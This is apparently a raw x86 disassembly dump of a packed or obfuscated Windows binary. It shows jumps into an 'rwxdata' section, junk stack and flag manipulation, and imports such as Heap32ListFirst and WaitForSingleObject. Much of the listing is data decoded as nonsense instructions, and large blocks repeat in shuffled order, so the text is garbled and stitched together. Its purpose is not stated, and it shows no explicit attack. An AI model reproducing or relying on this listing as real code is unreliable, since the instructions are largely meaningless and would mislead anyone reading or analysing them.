call sub_5182c0
xor esi [ edx ]
inc esi
imul esi [ edx + 0x73 ] 0x9e680074
daa
shl [ esi + 0x1e9ae8 ] 0x0
scasb [ edi ]
mov esp 0xe84243ef
sub bh bl
jb rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
push 0xfec010a5
call sub_518018
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_51646d
stc
mov [ esp ] ch
pushfd
cmp eax 0x7d00
jmp rwxdata
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
stc
cmp ah 0x5
call sub_516ddd
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jpe rwxdata
call sub_515ff7
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
je rwxdata
jns rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
